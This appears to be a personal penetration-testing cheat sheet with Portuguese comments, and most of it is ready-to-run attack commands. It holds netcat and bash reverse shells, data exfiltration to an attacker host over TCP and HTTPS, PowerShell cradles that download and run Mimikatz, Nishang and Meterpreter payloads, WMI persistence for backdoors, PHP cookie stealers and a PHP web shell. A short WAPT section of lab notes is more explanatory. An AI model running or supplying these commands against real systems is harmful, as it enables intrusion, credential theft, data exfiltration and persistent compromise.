		#!/usr/bin/perl
		print "Content-type: text/html\n\n";
		system("nc -nv 172.16.80.5 4444 -e /bin/bash ");

#SQLi 
	#Usar áspas simples
	#Encontrar erro com boolean
		/site.html?id=1' and 1=1; -- -							' #mudar para 2 e avaliar resultado

#Compactar pasta 
	tar c ../tmp/tudo.tar *

#Exfil Data over TCP 
	nc -nlvp 80 > datafolder.tmp
	tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<IP_ATTACKER>/80
	dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar 
	tar xf datafolder.tar 
	#OU nao tao escondido 
	tar zcf - /tmp/datafolder | ssh root@<IP_ATTCK> "cd /tmp; tar zxpf -"

#Exfil Data Over HTTPS
	#Contact.php - Atacante
	<?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>
	#Envio do arquivo via POST - Alvo 
	curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<attacker_server>/contact.php
	#Tratamento dos dados - Atacante 
	cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar

#POWERSHELL 
	#Resumo: Exemplo de download e execução em memória 
	powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101/Get-VaultCredential.ps1'); Get-VaultCredential"
	#Comandos Básicos
		#Execution Policy - https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
		Get-ExecutionPolicy
		Set-ExecutionPolicy Bypass

		#Bypass do Execution Policy
		powershell.exe -ExecutionPolicy Bypass .\script.ps1
		powershell.exe -ep Bypass .\script.ps1
		powershell.exe -ex by .\script.ps1

		powershell.exe -ExecutionPolicy Unrestricted .\script.ps1

		#Executar sem janela
		powershell.exe -WindowStyle Hidden .\script.ps1
		powershell.exe -W h .\script.ps1
		powershell.exe -Wi hi .\script.ps1
		#Executar comando em base64
		powershell.exe -EncodedCommand $encodedCommand
		powershell.exe -enco $encodedCommand
		powershell.exe -ec $encodedCommand
		#Executar comandos 
		powershell.exe -Command Get-Process
		powershell.exe -Command “& { Get-EventLog –LogName security }”
		#Nao carregar profiles 
		powershell.exe -NoProfile .\script.ps1
		#Downgrade para outra versao 
		powershell.exe –Version 2

		#Ajuda
		Update-Help
		Get-Help comando
		Get-Help Get-Process -Full
		Get-Help Get-Process -Examples
		Get-Help Get-Help -Online

		#Ver comandos e aliases
		Get-command
		Get-Command –Name *Firewall*
	 	
	 	#Listar processos 
	 	Get-Process
	 	Get-Process | Format-List *
	 	Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path
	 	Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path,Id

	 	#Listar serviços
	 	Get-Service
	 	Get-Service | Sort-Object Status -Descending

	 	#Aliases
	 	Get-ChildItem 
	 	ls
	 	dir 
		Get-Alias -Definition Get-ChildItem

		#Informacao sobre o sistema
		Get-WmiObject -class win32_operatingsystem | select -Property *
		Get-WmiObject -class win32_operatingsystem | fl *
		Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\host_info.csv

		#Enumerar serviços
		Get-WmiObject -class win32_service |Sort-Object -Unique PathName | fl Pathname

		#Registro - Windows Registry Hives
		cd HKLM:\

		#Alternativa ao egrep 
		Select-String -Path C:\users\user\Documents\*.txt -Pattern pass*

		ls -r C:\users\user\Documents -File *.txt | % {sls -Path $_ -Pattern pass* }

		#Ler arquivo
		Get-Content C:\Users\user\Documents\passwords.txt

		#Modulos
		$Env:PSModulePath
		Get-Module -ListAvaliable
		Import-Module .\module.psm1

		#FOREACH
		$services = Get-Service
		foreach ($service in $services) { $service.Name }

		#PortScan 
		$ports=(81,444);$ip="192.168.13.250"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if ($socket -eq $null) {echo $ip":"$port" - Closed";}else{echo $ip":"$port" - Open"; $socket = $null;}}

		#Criar Objetos - Exemplo
		$webclient = New-Object System.Net.WebClient
		$payload_url = "https://attacker_host/payload.exe"
		$file = "C:\ProgramData\payload.exe"
		$webclient.DownloadFile($payload_url,$file)

	#PowerShell da maldade
		#Download e execução em memória - dica Hospedar em HTTPS 
		#https://github.com/danielbohannon/Invoke-CradleCrafter
			#Comando Separado - Possível definir o User da requisição do webclient
			PS C:\> $downloader = New-Object System.Net.WebClient 
			PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
			PS C:\> $payload = "http://attacker_url/script.ps1"
			PS C:\> $command = $downloader.DownloadString($payload) 
			PS C:\> Invoke-Expression $command
			#Comando Completo com webclient DownloadString
			iex (New-Object Net.Webclient).DownloadString("http://attacker_url/script.ps1")
			powershell iex (New-Object Net.Webclient).DownloadString('http://foophonesels.com:5923/tmp/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts "10.185.10.0/24" -PingOnly
 
			iex (New-Object Net.Webclient).DownloadString("http://attacker_url/Copy-VSS.ps1"); Copy-VSS
	 
			#Web-Request 
				PS C:\> $req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1") 
				PS C:\> $res = $req.GetResponse()
				PS C:\> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

				#WebRequest via proxy 
				PS C:\> $req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1") 
				PS C:\> $res = $req.GetResponse()
				PS C:\> $proxy = [Net.WebRequest::GetSystemWebProxy()
				PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
				PS C:\> $req.Proxy = $proxy
				PS C:\> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

			#XMLDocument
				#Exemplo de XML 
					<?xml version="1.0"?>
					<command>
					   <a>
					      <execute>Get-Process</execute>
						</a> 
					</command>
				#Download e Execução
					PS C:\> $xmldoc = New-Object System.Xml.XmlDocument 
					PS C:\> $xmldoc.Load("http://attacker_URL/file.xml") 
					PS C:\> iex $xmldoc.command.a.execute

			#COM Objects
				#Msxml2.XMLHTTP
				PS C:\> $downloader = New-Object –ComObject Msxml2.XMLHTTP
				PS C:\> $downloader.open("GET", "http://attacker_URL/script.ps1", $false) 
				PS C:\> $downloader.send()
				PS C:\> iex $downloader.responseText

				#WinHTTP.WinHTTPRequest.5.1
				PS C:\> $downloader = New-Object –ComObject WinHttp.WinHttpRequest.5.1
				PS C:\> $downloader.open("GET", "http://attacker_URL/script.ps1", $false) 
				PS C:\> $downloader.send()
				PS C:\> iex $downloader.responseText

		#Download em Disco 
			#WebClient DownloadFile
			PS C:\> $downloader = New-Object System.Net.WebClient 
			PS C:\> $payload = "http://attacker_URL/payload.exe" 
			PS C:\> $local_file = "C:\programdata\payload.exe"
			PS C:\> $downloader.DownloadFile($payload,$local_file) 
			PS C:\> & $local_file
		 
		#Download via Proxy
			PS C:\> $downloader = New-Object System.Net.WebClient
			PS C:\> $payload = http://attacker_URL/script.ps1
			PS C:\> $cmd = $downloader.DownloadFile($payload)
			PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
			PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials 
			PS C:\> $downloader.Proxy = $proxy
			PS C:\> iex $cmd
		 
		#Comando encodado em base64 
			PS C:\> $command = ‘net user admin1 “p@ssw0rd9001” /ADD; net localgroup administrators admin1 /add’ 
			PS C:\> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
			PS C:\> $encodedCommand = [Convert]::ToBase64String($bytes)
	 
		#Modulos importados de terceiros
			Invoke-CradleCrafter - https://github.com/danielbohannon/Invoke-CradleCrafter
			Invoke-Obfuscation - https://github.com/danielbohannon/Invoke-Obfuscation
			Invoke-Powersploit - https://github.com/PowerShellMafia/PowerSploit
			Invoke-ARPScan - https://github.com/darkoperator/Posh-SecMod

		Nishang - https://github.com/samratashok/nishang
			#Copy-VSS - Tenta copiar todo SAM database
				powershell.exe -Command "iex (New-Object Net.Webclient).DownloadString('http://10.100.11.101:8082/Gather/Copy-VSS.ps1'); Copy-VSS"
				iex (New-Object Net.Webclient).DownloadString("http://10.100.11.101:8082/Gather/Copy-VSS.ps1"); Copy-VSS
		 
			#Get-Information 
				powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101:8082/Gather/Get-Information.ps1'); Get-Information"
				iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-Information.ps1'); Get-Information
		 	
		 	#Get-PassHint
		 		iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-PassHints'); Get-PassHints
		 
		 	#Mimikatz 
		 		powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101:8082/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
		 		 iex (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz'); Invoke-Mimikatz -DumpCreds
		 	#Invoke-bruteforce 
		 		Invoke-BruteForce –ComputerName targetdomain.com –UserList C:\temp\users.txt
		           –PasswordList C:\temp\pwds.txt –Service ActiveDirectory –StopOnSuccess -Verbose

		    #ReversePowerShell - Netcat - Texto cLaro - Levar em consideração
		    	powershell.exe –Command iex (New-Object Net.WebClient).DownloadString(‘http://<attacker_URL>/Invoke-PowerShellTcp.ps1’); Invoke-PowerShellTcp -Reverse -IPAddress <listener_IP> -Port 4444

		PowerLurk - persistência - https://github.com/Sw4mpf0x/PowerLurk
			#Download de backdoor
			powershell.exe -Command iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:1011/zrev.exe', 'C:\Windows\system32\zrev.exe');
			iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101/backdoor.exe', 'C:\programdata\payload.exe ');

			#Executar PS1 Remoto com DownloadCradle - Criar persistencia com payload ja na máquina alvo
			iex (New-Object Net.WebClient).DownloadString('http://attacker/Powerlurk.ps1'); Registrer-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\programdata\payload.exe" -Trigger ProcessStrat -ProcessName calc.exe

			#Verificar Evento Malicioso
			iex (New-Object Net.WebClient).DownloadString('http://attacker/Powerlurk.ps1'); Get-WmiEvent -Name CalcExec

			#Remover Evento malicioso
			iex (New-Object Net.WebClient).DownloadString('http://attacker/Powerlurk.ps1'); Get-WmiEvent -Name CalcExec | Remove-WmiObject

		#Empire 
			docker pull empireproject/empire
			docker volume create empire-data
			docker run -it --name empire -v empire-data:/opt/Empire/data -p 443:443 --entrypoint bash empireproject/empire
			docker start -ai empire
			./setup/install.sh

		#Powershell + Meterpreter
			msfvenom -p windows/x64/meterpreter_everse_https lport=443 lhost=10.10.10.10 -f psh-reflection -o arquivo.ps1
			> use multi/handler
			powershell.exe iex (New-Object Net.Webclient).DownloadString('http://10.10.10.10/arquivo.ps1')
			powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101/Get-VaultCredential.ps1'); Get-VaultCredential"

#Exploração de Cliente na Rede que acessem um Website que se tenha controle 
	#  Name                               Disclosure Date  Rank    Check  Description
	-  ----                               ---------------  ----    -----  -----------
	0  auxiliary/server/browser_autopwn                    normal  No     HTTP Client Automatic Exploiter
	1  auxiliary/server/browser_autopwn2  2015-07-05       normal  No     HTTP Client Automatic Exploiter 2 (Browser Autopwn)
	#No caso do LAB que dava bizu do Java
	18  exploit/multi/browser/java_rhino  

#E-mail regex 
	cat Novoarquivo | egrep -o '[a-z._0-9A-Z]*@[a-z]*\.[a-z]{2,3}\.?[a-z]{0,2}'

#MONA 
	!mona
	!mona conf -get workingfolder
	!mona conf -set workingfolder c:\temp
	!mona pattern_create 400
	!mona pattern_offset 37694136
	!mona jmp –r esp
	!mona seh –n

#TOMCAT - explorar o /manager para fazer upload de arquivos 
   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_deploy     2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   1  exploit/multi/http/tomcat_mgr_upload     2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   2  auxiliary/scanner/http/tomcat_mgr_login                   normal     No     Tomcat Application Manager Login Utility

#COOKIES - Roubo através de php - Atenção ao Same Origin Police 

	#1
		<?php
		$steal = fopen("/home/cassio/Downloads/phpggc/log.txt", "a");
		foreach ($_COOKIE as $key=>$val)
		  {
		    fwrite($steal, $val ."\n");
		  }
		fclose($steal);
		?>

	#2 

		<?php
		$cookie = $_COOKIE["name"];
		$steal = fopen("log.txt", "a");
		fwrite($steal, $cookie ."\n"); //<---- Must be $cookie instead of $name
		fclose($steal);
		?>

	#3

		<?php
		if(isset($_COOKIE["name"]))
		{
		    file_put_contents('log.txt',$_COOKIE["name"].PHP_EOL,FILE_APPEND);
		}
		else {  file_put_contents('log.txt',"No Cookie Found!!".PHP_EOL,FILE_APPEND); }
		?>

#WAPT 
	#PUT - lembrar de ajustar o content length
	#SQLi - nao esquecer de testar também cabecalhos http como User-Agent

	#Atenção a links de resetar senhas em páginas de login, podem ser fixos ou "adivinháveis"
		#Lab "desafio"
			#1 - Link de reset de senha com uid =nome do usuario 
			#2 - Uid como nome, dessa vez deveria faszer uma requisição antes para a conta alvo também
			#3 - Tokken reutilizavel, vc pedia um reset e um token era criado e podia ser usado para qualquer conta
			#4 - Tokken reutilizados, apos varias requisicoes para troca se fez uma lista e dps forca bruta

	#Incorrect Session Destruction = Session Cookies não apagados após o Logout podem ser reutilizados 
	#Insecure Direct Object References – Bypass de autorização, acessar objeto proibido mesmo sem autorizacao [ Não é bypass de autenticação, é acessar um documento probido através de um paramedtro id por exemplo ]
	#Missing Function Level Access Control - Acesso á páginas que deviram estar protegidas.
	#Ao acessar páginas de login sem estar logado, provavelmente será redirecionado a página de erro ou login, atento aos redirecionamentos, podem vir com o conteúdo da pagina de forma errônea

	#Flash files SWF - verificar presenca de arquivos com o swfparser -e 
		swfparser -e file.swf 
		#Também buscar por XSS que aceite Flash commands

	#HTML5 - Cross Domain XSS 
		#Procurar por 
			Access-Conrol-Allow-Origin:
			Access-Control-Allow-Credentials:
	#Html5 - Local Storage Stealing por XSS 
		#Procurar por 
			localStorage.setItem(){}
			localStorage.clear(){}
	#Html5 - Cross Window Messaging
		#Procurar por
			window.addEventListener(){}
			
#Verificar associações de arquivo no Windows 
	assoc
	assoc | findstr /i "word"
	assoc | findstr /i "excel"
	assoc | findstr /i "powerp"

#RunDll executando javascript no windows 
	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('foo');


# Open Redirect - Google 
	https://accounts.google.com/ServiceLogin?continue=https://appengine.google.com/_ah/conflogin?continue=https://attacker.domain/&service=ah


# Compatibilidade 
reg.exe Add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\inetpub\wwwroot\PsExec64.exe -u david -p 012345 cmd.exe" /d "WIN7RTM"

## TFTP 
	atftp --verbose  -g -r "\\windows\\win.ini" 10.11.1.111
	atftp --verbose -g -r "\\Program Files\\Microsoft SQL Server\\MSSQL14.SQLEXPRESS\\MSSQL\\Binn\\Templates\\master.mdf" 10.11.1.111
	tftp 10.11.1.111
		?
		status
		binary
		get FILE

	dir /x #para pegar o caminho curto e evitar espaços 


# PHP WEB SHELL 

	<?php system($_GET['cmd']); ?>

	+----------------+-----------------+----------------+----------------+
	|    Command     | Displays Output | Can Get Output | Gets Exit Code |
	+----------------+-----------------+----------------+----------------+
	| system()       | Yes (as text)   | Last line only | Yes            |
	| passthru()     | Yes (raw)       | No             | Yes            |
	| exec()         | No              | Yes (array)    | Yes            |
	| shell_exec()   | No              | Yes (string)   | No             |
	| backticks (``) | No              | Yes (string)   | No             |
	+----------------+-----------------+----------------+----------------+

	<?php system("id"); ?>
	<?php passthru("whoami"); ?>
	<?php echo shell_exec("ls"); ?>
	<?php echo exec("cat /etc/passwd"); ?>
	# Teste de qual funciona 
	<?php  system("id"); passthru("whoami"); echo shell_exec("ls"); echo exec("cat /etc/passwd"); ?>
	# Shell reverso
	<?php system("id"); system('bash -i >& /dev/tcp/192.168.119.137/8080 0>&1');?>
	<?php system('rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1| nc 192.168.119.137 8080 >/tmp/f'); ?>